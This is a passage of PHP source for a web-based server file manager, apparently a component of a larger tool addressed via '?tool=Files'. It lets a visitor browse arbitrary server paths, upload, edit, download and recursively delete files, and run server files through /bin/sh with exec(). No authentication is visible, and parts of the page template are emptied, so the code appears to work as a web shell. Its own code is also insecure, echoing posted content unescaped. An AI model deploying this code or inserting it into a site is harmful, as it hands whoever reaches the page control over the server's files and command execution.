		$cmp = $array[floor(($first + $last) / 2)][$key];
		$l = $first;
		$r = $last;
		while ($l <= $r) {
			while ($array[$l][$key] < $cmp) $l++;
			while ($array[$r][$key] > $cmp) $r--;
			if ($l <= $r) {
				$tmp = $array[$l];
				$array[$l] = $array[$r];
				$array[$r] = $tmp;
				$l++;
				$r--;
			}
		}
		quicksort($array, $first, $r, $key);
		quicksort($array, $l, $last, $key);
	}
}
function permission_octal2string ($mode) {
	if (($mode & 0xC000) === 0xC000) {
		$type = 's';
	} elseif (($mode & 0xA000) === 0xA000) {
		$type = 'l';
	} elseif (($mode & 0x8000) === 0x8000) {
		$type = '-';
	} elseif (($mode & 0x6000) === 0x6000) {
		$type = 'b';
	} elseif (($mode & 0x4000) === 0x4000) {
		$type = 'd';
	} elseif (($mode & 0x2000) === 0x2000) {
		$type = 'c';
	} elseif (($mode & 0x1000) === 0x1000) {
		$type = 'p';
	} else {
		$type = '?';
	}
	$owner  = ($mode & 00400) ? 'r' : '-';
	$owner .= ($mode & 00200) ? 'w' : '-';
	if ($mode & 0x800) {
		$owner .= ($mode & 00100) ? 's' : 'S';
	} else {
		$owner .= ($mode & 00100) ? 'x' : '-';
	}
	$group  = ($mode & 00040) ? 'r' : '-';
	$group .= ($mode & 00020) ? 'w' : '-';
	if ($mode & 0x400) {
		$group .= ($mode & 00010) ? 's' : 'S';
	} else {
		$group .= ($mode & 00010) ? 'x' : '-';
	}
	$other  = ($mode & 00004) ? 'r' : '-';
	$other .= ($mode & 00002) ? 'w' : '-';
	if ($mode & 0x200) {
		$other .= ($mode & 00001) ? 't' : 'T';
	} else {
		$other .= ($mode & 00001) ? 'x' : '-';
	}
	return $type . $owner . $group . $other;
}
function is_script ($filename) {
	return ereg('\.php$|\.php3$|\.php4$|\.php5$', $filename);
}
function getmimetype ($filename) {
	static $mimes = array(
		'\.jpg$|\.jpeg$'  => 'image/jpeg',
		'\.gif$'          => 'image/gif',
		'\.png$'          => 'image/png',
		'\.html$|\.html$' => 'text/html',
		'\.txt$|\.asc$'   => 'text/plain',
		'\.xml$|\.xsl$'   => 'application/xml',
		'\.pdf$'          => 'application/pdf'
	);
	foreach ($mimes as $regex => $mime) {
		if (eregi($regex, $filename)) return $mime;
	}
	return 'text/plain';
}
function del ($file) {
	global $delim;
	if (!@is_link($file) && !file_exists($file)) return false;
	if (!@is_link($file) && @is_dir($file)) {
		if ($dir = @opendir($file)) {
			$error = false;
			while (($f = readdir($dir)) !== false) {
				if ($f != '.' && $f != '..' && !del($file . $delim . $f)) {
					$error = true;
				}
			}
			closedir($dir);
			if (!$error) return @rmdir($file);
			return !$error;
		} else {
			return false;
		}
	} else {
		return @unlink($file);
	}
}
function addslash ($directory) {
	global $delim;
	if (substr($directory, -1, 1) != $delim) {
		return $directory . $delim;
	} else {
		return $directory;
	}
}
function relative2absolute ($string, $directory) {
	if (path_is_relative($string)) {
		return simplify_path(addslash($directory) . $string);
	} else {
		return simplify_path($string);
	}
}
function path_is_relative ($path) {
	global $win;
	if ($win) {
		return (substr($path, 1, 1) != ':');
	} else {
		return (substr($path, 0, 1) != '/');
	}
}
function absolute2relative ($directory, $target) {
	global $delim;
	$path = '';
	while ($directory != $target) {
		if ($directory == substr($target, 0, strlen($directory))) {
			$path .= substr($target, strlen($directory));
			break;
		} else {
			$path .= '..' . $delim;
			$directory = substr($directory, 0, strrpos(substr($directory, 0, -1), $delim) + 1);
		}
	}
	if ($path == '') $path = '.';
	return $path;
}
function simplify_path ($path) {
	global $delim;
	if (@file_exists($path) && function_exists('realpath') && @realpath($path) != '') {
		$path = realpath($path);
		if (@is_dir($path)) {
			return addslash($path);
		} else {
			return $path;
		}
	}
	$pattern  = $delim . '.' . $delim;
	if (@is_dir($path)) {
		$path = addslash($path);
	}
	while (strpos($path, $pattern) !== false) {
		$path = str_replace($pattern, $delim, $path);
	}
	$e = addslashes($delim);
	$regex = $e . '((\.[^\.' . $e . '][^' . $e . ']*)|(\.\.[^' . $e . ']+)|([^\.][^' . $e . ']*))' . $e . '\.\.' . $e;
	while (ereg($regex, $path)) {
		$path = ereg_replace($regex, $delim, $path);
	}
	return $path;
}
function human_filesize ($filesize) {
	$suffices = 'kMGTPE';
	$n = 0;
	while ($filesize >= 1000) {
		$filesize /= 1024;
		$n++;
	}
	$filesize = round($filesize, 3 - strpos($filesize, '.'));
	if (strpos($filesize, '.') !== false) {
		while (in_array(substr($filesize, -1, 1), array('0', '.'))) {
			$filesize = substr($filesize, 0, strlen($filesize) - 1);
		}
	}
	$suffix = (($n == 0) ? '' : substr($suffices, $n - 1, 1));
	return $filesize . " {$suffix}B";
}
function strip (&$str) {
	$str = stripslashes($str);
}
function listing_page ($message = null) {
	global $self, $directory, $sort, $reverse;
	html_header();
	$list = getlist($directory);
	if (array_key_exists('sort', $_GET)) $sort = $_GET['sort']; else $sort = 'filename';
	if (array_key_exists('reverse', $_GET) && $_GET['reverse'] == 'true') $reverse = true; else $reverse = false;
	sortlist($list, $sort, $reverse);
	echo '
<form enctype="multipart/form-data" action="' . $self . '?tool=Files" method="post">
<table id="main">
';
	directory_choice();
	if (!empty($message)) {
		spacer();
		echo $message;
	}
	if (@is_writable($directory)) {
		upload_box();
		create_box();
	} else {
		spacer();
	}
	if ($list) {
		listing($list);
	} else {
		echo error('not_readable', $directory);
	}
	echo '</table>
</form>
';
	html_footer();
}
function listing ($list) {
	global $directory, $homedir, $sort, $reverse, $win, $cols, $date_format, $self;
	echo '<tr class="listing">
	<th style="text-align: center; vertical-align: middle"></th>
';
	$d = 'tool=Files&dir=' . urlencode($directory) . '&amp;';
	if (!$reverse && $sort == 'filename') $r = '&amp;reverse=true'; else $r = '';
	echo "\t<th class=\"filename\"><a href=\"$self?{$d}sort=filename$r\">" . word('filename') . "</a></th>\n";
	if (!$reverse && $sort == 'size') $r = '&amp;reverse=true'; else $r = '';
	echo "\t<th class=\"size\"><a href=\"$self?{$d}sort=size$r\">" . word('size') . "</a></th>\n";
	if (!$win) {
		if (!$reverse && $sort == 'permission') $r = '&amp;reverse=true'; else $r = '';
		echo "\t<th class=\"permission_header\"><a href=\"$self?{$d}sort=permission$r\">" . word('permission') . "</a></th>\n";
		if (!$reverse && $sort == 'owner') $r = '&amp;reverse=true'; else $r = '';
		echo "\t<th class=\"owner\"><a href=\"$self?{$d}sort=owner$r\">" . word('owner') . "</a></th>\n";
		if (!$reverse && $sort == 'group') $r = '&amp;reverse=true'; else $r = '';
		echo "\t<th class=\"group\"><a href=\"$self?{$d}sort=group$r\">" . word('group') . "</a></th>\n";
	}
	echo '	<th class="functions">' . word('functions') . '</th>
</tr>
';
	for ($i = 0; $i < sizeof($list); $i++) {
		$file = $list[$i];
		$timestamps  = 'mtime: ' . date($date_format, $file['mtime']) . ', ';
		$timestamps .= 'atime: ' . date($date_format, $file['atime']) . ', ';
		$timestamps .= 'ctime: ' . date($date_format, $file['ctime']);
		echo '<tr class="listing">
	<td class="checkbox"><input type="checkbox" name="checked' . $i . '" value="true" onfocus="activate(\'other\')" /></td>
	<td class="filename" title="' . html($timestamps) . '">';
		if ($file['is_link']) {
	
			echo html($file['filename']) . ' &rarr; ';
			$real_file = relative2absolute($file['target'], $directory);
			if (@is_readable($real_file)) {
				if (@is_dir($real_file)) {
					echo '[ <a href="' . $self . '?tool=Files&dir=' . urlencode($real_file) . '">' . html($file['target']) . '</a> ]';
				} else {
					echo '<a href="' . $self . '?tool=Files&action=view&amp;file=' . urlencode($real_file) . '">' . html($file['target']) . '</a>';
				}
			} else {
				echo html($file['target']);
			}
		} elseif ($file['is_dir']) {
			echo ' [ ';
			if ($win || $file['is_executable']) {
				echo '<a href="' . $self . '?tool=Files&dir=' . urlencode($file['path']) . '">' . html($file['filename']) . '</a>';
			} else {
				echo html($file['filename']);
			}
			echo ' ]';
		} else {
			if (substr($file['filename'], 0, 1) == '.') {
				echo '';
			} else {
				echo '';
			}
			if ($file['is_file'] && $file['is_readable']) {
			   echo '<a href="' . $self . '?tool=Files&action=view&amp;file=' . urlencode($file['path']) . '">' . html($file['filename']) . '</a>';
			} else {
				echo html($file['filename']);
			}
		}
		if ($file['size'] >= 1000) {
			$human = ' title="' . human_filesize($file['size']) . '"';
		} else {
			$human = '';
		}
		echo "\t<td class=\"size\"$human>{$file['size']} B</td>\n";
		if (!$win) {
			echo "\t<td class=\"permission\" title=\"" . decoct($file['permission']) . '">';
			$l = !$file['is_link'] && (!function_exists('posix_getuid') || $file['owner'] == posix_getuid());
			if ($l) echo '<a href="' . $self . '?tool=Files&action=permission&amp;file=' . urlencode($file['path']) . '&amp;dir=' . urlencode($directory) . '">';
			echo html(permission_octal2string($file['permission']));
			if ($l) echo '</a>';
			echo "</td>\n";
			if (array_key_exists('owner_name', $file)) {
				echo "\t<td class=\"owner\" title=\"uid: {$file['owner']}\">{$file['owner_name']}</td>\n";
			} else {
				echo "\t<td class=\"owner\">{$file['owner']}</td>\n";
			}
			if (array_key_exists('group_name', $file)) {
				echo "\t<td class=\"group\" title=\"gid: {$file['group']}\">{$file['group_name']}</td>\n";
			} else {
				echo "\t<td class=\"group\">{$file['group']}</td>\n";
			}
		}
		echo '	<td class="functions">
		<input type="hidden" name="file' . $i . '" value="' . html($file['path']) . '" />
';
		$actions = array();
		if (function_exists('symlink')) {
			$actions[] = 'create_symlink';
		}
		if (@is_writable(dirname($file['path']))) {
			$actions[] = 'delete';
			$actions[] = 'rename';
			$actions[] = 'move';
		}
		if ($file['is_file'] && $file['is_readable']) {
			$actions[] = 'copy';
			$actions[] = 'download';
			if ($file['is_writable']) $actions[] = 'edit';
		}
		if (!$win && function_exists('exec') && $file['is_file'] && $file['is_executable'] && file_exists('/bin/sh')) {
			$actions[] = 'execute';
		}
		if (sizeof($actions) > 0) {
			echo '		<select class="small" name="action' . $i . '" size="1">
		<option value="">' . str_repeat('&nbsp;', 30) . '</option>
';
			foreach ($actions as $action) {
				echo "\t\t<option value=\"$action\">" . word($action) . "</option>\n";
			}
			echo '		</select>
		<input class="small" type="submit" name="submit' . $i . '" value=" &gt; " onfocus="activate(\'other\')" />
';
		}
		echo '	</td>
</tr>
';
	}
	echo '<tr class="listing_footer">
	<td style="text-align: right; vertical-align: top"></td>
	<td colspan="' . ($cols - 1) . '">
		<input type="hidden" name="num" value="' . sizeof($list) . '" />
		<input type="hidden" name="focus" value="" />
		<input type="hidden" name="olddir" value="' . html($directory) . '" />
';
	$actions = array();
	if (@is_writable(dirname($file['path']))) {
		$actions[] = 'delete';
		$actions[] = 'move';
	}
	$actions[] = 'copy';
	echo '		<select class="small" name="action_all" size="1">
		<option value="">' . str_repeat('&nbsp;', 30) . '</option>
';
	foreach ($actions as $action) {
		echo "\t\t<option value=\"$action\">" . word($action) . "</option>\n";
	}
	echo '		</select>
		<input class="small" type="submit" name="submit_all" value=" &gt; " onfocus="activate(\'other\')" />
	</td>
</tr>
';
}
function directory_choice () {
	global $directory, $homedir, $cols, $self;
	echo '<tr>
	<td colspan="' . $cols . '" id="directory">
		<a href="' . $self . '?tool=Files&dir=' . urlencode($homedir) . '">' . word('directory') . '</a>:
		<input type="text" name="dir" size="' . textfieldsize($directory) . '" value="' . html($directory) . '" onfocus="activate(\'directory\')" />
		<input type="submit" name="changedir" value="' . word('change') . '" onfocus="activate(\'directory\')" />
	</td>
</tr>
';
}
function upload_box () {
	global $cols;
	echo '<tr>
	<td colspan="' . $cols . '" id="upload">
		' . word('file') . ':
		<input type="file" name="upload" onfocus="activate(\'other\')" />
		<input type="submit" name="submit_upload" value="' . word('upload') . '" onfocus="activate(\'other\')" />
	</td>
</tr>
';
}
function create_box () {
	global $cols;
	echo '<tr>
	<td colspan="' . $cols . '" id="create">
		<select name="create_type" size="1" onfocus="activate(\'create\')">
		<option value="file">' . word('file') . '</option>
		<option value="directory">' . word('directory') . '</option>
		</select>
		<input type="text" name="create_name" onfocus="activate(\'create\')" />
		<input type="submit" name="submit_create" value="' . word('create') . '" onfocus="activate(\'create\')" />
	</td>
</tr>
';
}
function edit ($file) {
	global $self, $directory, $editcols, $editrows, $apache, $htpasswd, $htaccess;
	html_header();
	echo '<h2 style="margin-bottom: 3pt">' . html($file) . '</h2>
<form action="' . $self . '?tool=Files" method="post">
<table class="dialog">
<tr>
<td class="dialog">
	<textarea name="content" cols="' . $editcols . '" rows="' . $editrows . '" WRAP="off">';
	if (array_key_exists('content', $_POST)) {
		echo $_POST['content'];
	} else {
		$f = fopen($file, 'r');
		while (!feof($f)) {
			echo html(fread($f, 8192));
		}
		fclose($f);
	}
	if (!empty($_POST['user'])) {
		echo "\n" . $_POST['user'] . ':' . crypt($_POST['password']);
	}
	if (!empty($_POST['basic_auth'])) {
		if ($win) {
			$authfile = str_replace('\\', '/', $directory) . $htpasswd;
		} else {
			$authfile = $directory . $htpasswd;
		}
		echo "\nAuthType Basic\nAuthName &quot;Restricted Directory&quot;\n";
		echo 'AuthUserFile &quot;' . html($authfile) . "&quot;\n";
		echo 'Require valid-user';
	}
	echo '</textarea>
	<hr />
';
	if ($apache && basename($file) == $htpasswd) {
		echo '
	' . word('user') . ': <input type="text" name="user" />
	' . word('password') . ': <input type="password" name="password" />
	<input type="submit" value="' . word('add') . '" />
	<hr />
';
	}
	if ($apache && basename($file) == $htaccess) {
		echo '
	<input type="submit" name="basic_auth" value="' . word('add_basic_auth') . '" />
	<hr />
';
	}
	echo '
	<input type="hidden" name="action" value="edit" />
	<input type="hidden" name="file" value="' . html($file) . '" />
	<input type="hidden" name="dir" value="' . html($directory) . '" />
	<input type="reset" value="' . word('reset') . '" id="red_button" />
	<input type="submit" name="save" value="' . word('save') . '" id="green_button" style="margin-left: 50px" />
</td>
</tr>
</table>
<p><a href="' . $self . '?tool=Files&dir=' . urlencode($directory) . '">[ ' . word('back') . ' ]</a></p>
</form>
';
	html_footer();
}
function spacer () {
	global $cols;
	echo '<tr>
	<td colspan="' . $cols . '" style="height: 1em"></td>
</tr>
';
}
function textfieldsize ($content) {
	$size = strlen($content) + 5;
	if ($size < 30) $size = 30;
	return $size;
}
function request_dump () {
	foreach ($_REQUEST as $key => $value) {
		echo "\t<input type=\"hidden\" name=\"" . html($key) . '" value="' . html($value) . "\" />\n";
	}
}
function html ($string) {
	global $charset;
	return htmlentities($string, ENT_COMPAT, $charset);
}
function word ($word) {
	global $words, $word_charset;
	return htmlentities($words[$word], ENT_COMPAT, $word_charset);
}
function phrase ($phrase, $arguments) {
	global $words;
	static $search;
	if (!is_array($search)) for ($i = 1; $i <= 8; $i++) $search[] = "%$i";
	for ($i = 0; $i < sizeof($arguments); $i++) {
		$arguments[$i] = nl2br(html($arguments[$i]));
	}
	$replace = array('{' => '<pre>', '}' =>'</pre>', '[' => '<b>', ']' => '</b>');
	return str_replace($search, $arguments, str_replace(array_keys($replace), $replace, nl2br(html($words[$phrase]))));
}
function getwords ($lang) {
	global $word_charset, $date_format;
	switch ($lang) {
	case 'en':
	default:
		$date_format = 'n/j/y H:i:s';
		$word_charset = 'ISO-8859-1';
		return array(
'directory' => 'Directory',
'file' => 'File',
'filename' => 'Filename',
'size' => 'Size',
'permission' => 'Permission',
'owner' => 'Owner',
'group' => 'Group',
'other' => 'Others',
'functions' => 'Functions',
'read' => 'read',
'write' => 'write',
'execute' => 'execute',
'create_symlink' => 'create symlink',
'delete' => 'delete',
'rename' => 'rename',
'move' => 'move',
'copy' => 'copy',
'edit' => 'edit',
'download' => 'download',
'upload' => 'upload',
'create' => 'create',
'change' => 'change',
'save' => 'save',
'set' => 'set',
'reset' => 'reset',
'relative' => 'Relative path to target',
'yes' => 'Yes',
'no' => 'No',
'back' => 'back',
'destination' => 'Destination',
'symlink' => 'Symlink',
'no_output' => 'no output',
'user' => 'User',
'password' => 'Password',
'add' => 'add',
'add_basic_auth' => 'add basic-authentification',
'uploaded' => '"[%1]" has been uploaded.',
'not_uploaded' => '"[%1]" could not be uploaded.',
'already_exists' => '"[%1]" already exists.',
'created' => '"[%1]" has been created.',
'not_created' => '"[%1]" could not be created.',
'really_delete' => 'Delete these files?',
'deleted' => "These files have been deleted:\n[%1]",
'not_deleted' => "These files could not be deleted:\n[%1]",
'rename_file' => 'Rename file:',
'renamed' => '"[%1]" has been renamed to "[%2]".',
'not_renamed' => '"[%1] could not be renamed to "[%2]".',
'move_files' => 'Move these files:',
'moved' => "These files have been moved to \"[%2]\":\n[%1]",
'not_moved' => "These files could not be moved to \"[%2]\":\n[%1]",
'copy_files' => 'Copy these files:',
'copied' => "These files have been copied to \"[%2]\":\n[%1]",
'not_copied' => "These files could not be copied to \"[%2]\":\n[%1]",
'not_edited' => '"[%1]" can not be edited.',
'executed' => "\"[%1]\" has been executed successfully:\n{%2}",
'not_executed' => "\"[%1]\" could not be executed successfully:\n{%2}",
'saved' => '"[%1]" has been saved.',
'not_saved' => '"[%1]" could not be saved.',
'symlinked' => 'Symlink from "[%2]" to "[%1]" has been created.',
'not_symlinked' => 'Symlink from "[%2]" to "[%1]" could not be created.',
'permission_for' => 'Permission of "[%1]":',
'permission_set' => 'Permission of "[%1]" was set to [%2].',
'permission_not_set' => 'Permission of "[%1]" could not be set to [%2].',
'not_readable' => '"[%1]" can not be read.'
		);
	}
}
function getimage ($image) {
	
}
function html_header () {
	

}
function html_footer () {
	echo <<<END
</body>
</html>
END;
}
function notice ($phrase) {
	global $cols;
	$args = func_get_args();
	array_shift($args);
	return '<tr id="notice"><p><p><p><p><p><p><p><p><p><p><p><p><p><p><p><p><p><p><p><p><p><p>
	<td colspan="' . $cols . '">' . phrase($phrase, $args) . '</td>
</tr>
';
}
function error ($phrase) {
	global $cols;
	$args = func_get_args();
	array_shift($args);
	return '<tr id="error">
	<td colspan="' . $cols . '">' . phrase($phrase, $args) . '</td>
</tr>
';
}


////
$homedir = './';
if (get_magic_quotes_gpc()) {
	array_walk($_GET, 'strip');
	array_walk($_POST, 'strip');
	array_walk($_REQUEST, 'strip');
}
if (array_key_exists('image', $_GET)) {
	header('Content-Type: image/gif');
	die(getimage($_GET['image']));
}
$delim = DIRECTORY_SEPARATOR;
if (function_exists('php_uname')) {
	$win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? true : false;
} else {
	$win = ($delim == '\\') ? true : false;
}
if (!empty($_SERVER['PATH_TRANSLATED'])) {
	$scriptdir = dirname($_SERVER['PATH_TRANSLATED']);
} elseif (!empty($_SERVER['SCRIPT_FILENAME'])) {
	$scriptdir = dirname($_SERVER['SCRIPT_FILENAME']);
} elseif (function_exists('getcwd')) {
	$scriptdir = getcwd();
} else {
	$scriptdir = '.';
}
$homedir = relative2absolute($homedir, $scriptdir);

$dir = (array_key_exists('dir', $_REQUEST)) ? $_REQUEST['dir'] : $homedir;

if (array_key_exists('olddir', $_POST) && !path_is_relative($_POST['olddir'])) {
	$dir = relative2absolute($dir, $_POST['olddir']);
}

$directory = simplify_path(addslash($dir));

$files = array();
$action = '';
if (!empty($_POST['submit_all'])) {
	$action = $_POST['action_all'];
	for ($i = 0; $i < $_POST['num']; $i++) {
		if (array_key_exists("checked$i", $_POST) && $_POST["checked$i"] == 'true') {
			$files[] = $_POST["file$i"];
		}
	}
} elseif (!empty($_REQUEST['action'])) {
	$action = $_REQUEST['action'];
	$files[] = relative2absolute($_REQUEST['file'], $directory);
} elseif (!empty($_POST['submit_upload']) && !empty($_FILES['upload']['name'])) {
	$files[] = $_FILES['upload'];
	$action = 'upload';
} elseif (array_key_exists('num', $_POST)) {
	for ($i = 0; $i < $_POST['num']; $i++) {
		if (array_key_exists("submit$i", $_POST)) break;
	}
	if ($i < $_POST['num']) {
		$action = $_POST["action$i"];
		$files[] = $_POST["file$i"];
	}
}
if (empty($action) && (!empty($_POST['submit_create']) || (array_key_exists('focus', $_POST) && $_POST['focus'] == 'create')) && !empty($_POST['create_name'])) {
	$files[] = relative2absolute($_POST['create_name'], $directory);
	switch ($_POST['create_type']) {
	case 'directory':
		$action = 'create_directory';
		break;
	case 'file':
		$action = 'create_file';
	}
}
if (sizeof($files) == 0) $action = ''; else $file = reset($files);

if ($lang == 'auto') {
	if (array_key_exists('HTTP_ACCEPT_LANGUAGE', $_SERVER) && strlen($_SERVER['HTTP_ACCEPT_LANGUAGE']) >= 2) {
		$lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
	} else {
		$lang = 'en';
	}
}
$words = getwords($lang);
$cols = ($win) ? 4 : 7;
if (!isset($dirpermission)) {
	$dirpermission = (function_exists('umask')) ? (0777 & ~umask()) : 0755;
}
if (!isset($filepermission)) {
	$filepermission = (function_exists('umask')) ? (0666 & ~umask()) : 0644;
}
if (!empty($_SERVER['SCRIPT_NAME'])) {
	$self = html(basename($_SERVER['SCRIPT_NAME']));
} elseif (!empty($_SERVER['PHP_SELF'])) {
	$self = html(basename($_SERVER['PHP_SELF']));
} else {
	$self = '';
}
if (!empty($_SERVER['SERVER_SOFTWARE'])) {
	if (strtolower(substr($_SERVER['SERVER_SOFTWARE'], 0, 6)) == 'apache') {
		$apache = true;
	} else {
		$apache = false;
	}
} else {
	$apache = true;
}
switch ($action) {
case 'view':
	if (is_script($file)) {
		ob_start();
		highlight_file($file);
		$src = ereg_replace('<font color="([^"]*)">', '<span style="color: \1">', ob_get_contents());
		$src = str_replace(array('</font>', "\r", "\n"), array('</span>', '', ''), $src);
		ob_end_clean();
		html_header();
		echo '<h2 style="text-align: left; margin-bottom: 0">' . html($file) . '</h2>
<hr />
<table>
<tr>
<td style="text-align: right; vertical-align: top; color: gray; padding-right: 3pt; border-right: 1px solid gray">
<pre style="margin-top: 0"><code>';
		for ($i = 1; $i <= sizeof(file($file)); $i++) echo "$i\n";
		echo '</code></pre>
</td>
<td style="text-align: left; vertical-align: top; padding-left: 3pt">
<pre style="margin-top: 0">' . $src . '</pre>
</td>
</tr>
</table>
';
		html_footer();
	} else {
		echo '<textarea name="code" cols="150" rows="50" wrap="VIRTUAL" >';
		readfile($file);
	}
	break;
case 'download':
	header('Pragma: public');
	header('Expires: 0');
	header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
	header('Content-Type: ' . getmimetype($file));
	header('Content-Disposition: attachment; filename=' . basename($file) . ';');
	header('Content-Length: ' . filesize($file));
	readfile($file);
	break;
case 'upload':
	$dest = relative2absolute($file['name'], $directory);
	if (@file_exists($dest)) {
		listing_page(error('already_exists', $dest));
	} elseif (@move_uploaded_file($file['tmp_name'], $dest)) {
		listing_page(notice('uploaded', $file['name']));
	} else {
		listing_page(error('not_uploaded', $file['name']));
	}
	break;
case 'create_directory':
	if (@file_exists($file)) {
		listing_page(error('already_exists', $file));
	} else {
		$old = @umask(0777 & ~$dirpermission);
		if (@mkdir($file, $dirpermission)) {
			listing_page(notice('created', $file));
		} else {
			listing_page(error('not_created', $file));
		}
		@umask($old);
	}
	break;
case 'create_file':
	if (@file_exists($file)) {
		listing_page(error('already_exists', $file));
	} else {
		$old = @umask(0777 & ~$filepermission);
		if (@touch($file)) {
			edit($file);
		} else {
			listing_page(error('not_created', $file));
		}
		@umask($old);
	}
	break;
case 'execute':
	chdir(dirname($file));
	$output = array();
	$retval = 0;
	exec('echo "./' . basename($file) . '" | /bin/sh', $output, $retval);
	$error = ($retval == 0) ? false : true;
	if (sizeof($output) == 0) $output = array('<' . $words['no_output'] . '>');
	if ($error) {
		listing_page(error('not_executed', $file, implode("\n", $output)));
	} else {
		listing_page(notice('executed', $file, implode("\n", $output)));
	}
	break;
case 'delete':
	if (!empty($_POST['no'])) {
		listing_page();
	} elseif (!empty($_POST['yes'])) {
		$failure = array();
		$success = array();
		foreach ($files as $file) {
			if (del($file)) {
				$success[] = $file;
			} else {
				$failure[] = $file;
			}
		}
		$message = '';
		if (sizeof($failure) > 0) {
			$message = error('not_deleted', implode("\n", $failure));
		}
		if (sizeof($success) > 0) {
			$message .= notice('deleted', implode("\n", $success));
		}
		listing_page($message);
	} else {
		html_header();
		echo '<form action="' . $self . '?tool=Files" method="post">
<table class="dialog">
<tr>
<td class="dialog">
';
		request_dump();
		echo "\t<b>" . word('really_delete') . '</b>
	<p>
';
		foreach ($files as $file) {
			echo "\t" . html($file) . "<br />\n";
		}
		echo '	</p>
	<hr />
	<input type="submit" name="no" value="' . word('no') . '" id="red_button" />
	<input type="submit" name="yes" value="' . word('yes') . '" id="green_button" style="margin-left: 50px" />
</td>
</tr>
</table>
</form>
';
		html_footer();
	}
	break;
case 'rename':
	if (!empty($_POST['destination'])) {
		$dest = relative2absolute($_POST['destination'], $directory);
		if (!@file_exists($dest) && @rename($file, $dest)) {
			listing_page(notice('renamed', $file, $dest));
		} else {
			listing_page(error('not_renamed', $file, $dest));
		}
	} else {
		$name = basename($file);
		html_header();
		echo '<form action="' . $self . '?tool=Files" method="post">
<table class="dialog">
<tr>
<td class="dialog">
	<input type="hidden" name="action" value="rename" />
	<input type="hidden" name="file" value="' . html($file) . '" />
	<input type="hidden" name="dir" value="' . html($directory) . '" />
	<b>' . word('rename_file') . '</b>
	<p>' . html($file) . '</p>
	<b>' . substr($file, 0, strlen($file) - strlen($name)) . '</b>
	<input type="text" name="destination" size="' . textfieldsize($name) . '" value="' . html($name) . '" />
	<hr />
	<input type="submit" value="' . word('rename') . '" />
</td>
</tr>
</table>
<p><a href="' . $self . '?tool=Files&dir=' . urlencode($directory) . '">[ ' . word('back') . ' ]</a></p>
</form>
';
		html_footer();
	}
	break;
case 'move':
	if (!empty($_POST['destination'])) {
		$dest = relative2absolute($_POST['destination'], $directory);
		$failure = array();
		$success = array();
		foreach ($files as $file) {
			$filename = substr($file, strlen($directory));
			$d = $dest . $filename;
			if (!@file_exists($d) && @rename($file, $d)) {
				$success[] = $file;
			} else {
				$failure[] = $file;
			}
		}
		$message = '';
		if (sizeof($failure) > 0) {
			$message = error('not_moved', implode("\n", $failure), $dest);
		}
		if (sizeof($success) > 0) {
			$message .= notice('moved', implode("\n", $success), $dest);
		}
		listing_page($message);
	} else {
		html_header();
		echo '<form action="' . $self . '?tool=Files" method="post">
<table class="dialog">
<tr>
<td class="dialog">
';
		request_dump();
		echo "\t<b>" . word('move_files') . '</b>
	<p>
';
		foreach ($files as $file) {
			echo "\t" . html($file) . "<br />\n";
		}
		echo '	</p>
	<hr />
	' . word('destination') . ':
	<input type="text" name="destination" size="' . textfieldsize($directory) . '" value="' . html($directory) . '" />
	<input type="submit" value="' . word('move') . '" />
</td>
</tr>
</table>
<p><a href="' . $self . '?tool=Files&dir=' . urlencode($directory) . '">[ ' . word('back') . ' ]</a></p>
</form>
';
		html_footer();
	}
	break;
case 'copy':
	if (!empty($_POST['destination'])) {
		$dest = relative2absolute($_POST['destination'], $directory);
		if (@is_dir($dest)) {
			$failure = array();
			$success = array();
			foreach ($files as $file) {
				$filename = substr($file, strlen($directory));
				$d = addslash($dest) . $filename;
				if (!@is_dir($file) && !@file_exists($d) && @copy($file, $d)) {
					$success[] = $file;
				} else {
					$failure[] = $file;
				}
			}
			$message = '';
			if (sizeof($failure) > 0) {
				$message = error('not_copied', implode("\n", $failure), $dest);
			}
			if (sizeof($success) > 0) {
				$message .= notice('copied', implode("\n", $success), $dest);
			}
			listing_page($message);
		} else {
			if (!@file_exists($dest) && @copy($file, $dest)) {
				listing_page(notice('copied', $file, $dest));
			} else {
				listing_page(error('not_copied', $file, $dest));
			}
		}
	} else {
		html_header();
		echo '<form action="' . $self . '?tool=Files" method="post">
<table class="dialog">
<tr>
<td class="dialog">
';
		request_dump();
		echo "\n<b>" . word('copy_files') . '</b>
	<p>
';
		foreach ($files as $file) {
			echo "\t" . html($file) . "<br />\n";
		}
		echo '	</p>
	<hr />
	' . word('destination') . ':
	<input type="text" name="destination" size="' . textfieldsize($directory) . '" value="' . html($directory) . '" />
	<input type="submit" value="' . word('copy') . '" />
</td>
</tr>
</table>
<p><a href="' . $self . '?tool=Files&dir=' . urlencode($directory) . '">[ ' . word('back') . ' ]</a></p>
</form>
';
		html_footer();
	}
	break;
case 'create_symlink':
	if (!empty($_POST['destination'])) {
		$dest = relative2absolute($_POST['destination'], $directory);
		if (substr($dest, -1, 1) == $delim) $dest .= basename($file);
		if (!empty($_POST['relative'])) $file = absolute2relative(addslash(dirname($dest)), $file);
		if (!@file_exists($dest) && @symlink($file, $dest)) {
			listing_page(notice('symlinked', $file, $dest));
		} else {
			listing_page(error('not_symlinked', $file, $dest));
		}
	} else {
		html_header();
		echo '<form action="' . $self . '?tool=Files" method="post">
<table class="dialog" id="symlink">
<tr>
	<td style="vertical-align: top">' . word('destination') . ': </td>
	<td>
		<b>' . html($file) . '</b><br />
		<input type="checkbox" name="relative" value="yes" id="checkbox_relative" checked="checked" style="margin-top: 1ex" />
		<label for="checkbox_relative">' . word('relative') . '</label>
		<input type="hidden" name="action" value="create_symlink" />
		<input type="hidden" name="file" value="' . html($file) . '" />
		<input type="hidden" name="dir" value="' . html($directory) . '" />
	</td>
</tr>
<tr>
	<td>' . word('symlink') . ': </td>
	<td>
		<input type="text" name="destination" size="' . textfieldsize($directory) . '" value="' . html($directory) . '" />
		<input type="submit" value="' . word('create_symlink') . '" />
	</td>
</tr>
</table>
<p><a href="' . $self . '?tool=Files&dir=' . urlencode($directory) . '">[ ' . word('back') . ' ]</a></p>
</form>
';
		html_footer();
	}
	break;
case 'edit':
	if (!empty($_POST['save'])) {
		$content = str_replace("\r\n", "\n", $_POST['content']);
		if (($f = @fopen($file, 'w')) && @fwrite($f, $content) !== false && @fclose($f)) {
			listing_page(notice('saved', $file));
		} else {
			listing_page(error('not_saved', $file));
		}
	} else {
		if (@is_readable($file) && @is_writable($file)) {
			edit($file);
		} else {
			listing_page(error('not_edited', $file));
		}
	}
	break;
case 'permission':
	if (!empty($_POST['set'])) {
		$mode = 0;
